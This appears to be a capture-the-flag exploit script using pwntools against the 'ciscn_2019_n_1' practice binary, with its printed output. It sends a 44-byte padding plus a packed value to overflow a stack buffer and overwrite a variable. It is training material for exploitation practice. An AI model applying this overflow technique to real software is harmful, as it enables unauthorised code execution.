from pwn import *

serv = process('./ciscn_2019_n_1')

serv.recv()

payload = b'A'*44

payload += p64(0x41348000)
print(payload)
serv.sendline(payload)

serv.interactive()

└─$ \x00\x804A\x00\x00\x00\x00
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x80\x34\x41\x00\x00\x00\x00
